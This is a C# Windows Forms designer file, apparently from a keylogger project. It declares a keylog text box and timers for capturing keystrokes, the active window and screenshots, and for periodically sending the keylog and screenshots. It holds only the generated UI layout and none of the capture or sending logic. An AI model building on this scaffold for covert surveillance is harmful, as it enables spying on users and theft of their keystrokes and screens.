namespace advanced_ckey
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.txtkeylog = new System.Windows.Forms.TextBox();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.activewindowtimer = new System.Windows.Forms.Timer(this.components);
            this.sendkeylog_timer = new System.Windows.Forms.Timer(this.components);
            this.Sceenshot_timer = new System.Windows.Forms.Timer(this.components);
            this.keylog_timer = new System.Windows.Forms.Timer(this.components);
            this.sendscreenshot = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // txtkeylog
            // 
            this.txtkeylog.Location = new System.Drawing.Point(12, 12);
            this.txtkeylog.Multiline = true;
            this.txtkeylog.Name = "txtkeylog";
            this.txtkeylog.ScrollBars = System.Windows.Forms.ScrollBars.Both;
            this.txtkeylog.Size = new System.Drawing.Size(609, 426);
            this.txtkeylog.TabIndex = 0;
            // 
            // textBox2
            // 
            this.textBox2.Location = new System.Drawing.Point(638, 12);
            this.textBox2.Multiline = true;
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new System.Drawing.Size(162, 426);
            this.textBox2.TabIndex = 1;
            // 
            // activewindowtimer
            // 
            this.activewindowtimer.Enabled = true;
            this.activewindowtimer.Interval = 1;
            this.activewindowtimer.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // sendkeylog_timer
            // 
            this.sendkeylog_timer.Interval = 500000;
            this.sendkeylog_timer.Tick += new System.EventHandler(this.timer4_Tick);
            // 
            // Sceenshot_timer
            // 
            this.Sceenshot_timer.Interval = 10000;
            this.Sceenshot_timer.Tick += new System.EventHandler(this.Sceenshot_timer_Tick);
            // 
            // keylog_timer
            // 
            this.keylog_timer.Interval = 1000;
            this.keylog_timer.Tick += new System.EventHandler(this.keylog_timer_Tick);
            // 
            // sendscreenshot
            // 
            this.sendscreenshot.Interval = 500000;
            this.sendscreenshot.Tick += new System.EventHandler(this.sendscreenshot_Tick);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Controls.Add(this.textBox2);
            this.Controls.Add(this.txtkeylog);
            this.Name = "Form1";
            this.Text = "Form1";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        public System.Windows.Forms.Timer activewindowtimer;
        public System.Windows.Forms.Timer sendkeylog_timer;
        public System.Windows.Forms.TextBox txtkeylog;
        public System.Windows.Forms.TextBox textBox2;
        public System.Windows.Forms.Timer Sceenshot_timer;
        public System.Windows.Forms.Timer keylog_timer;
        private System.Windows.Forms.Timer sendscreenshot;
    }
}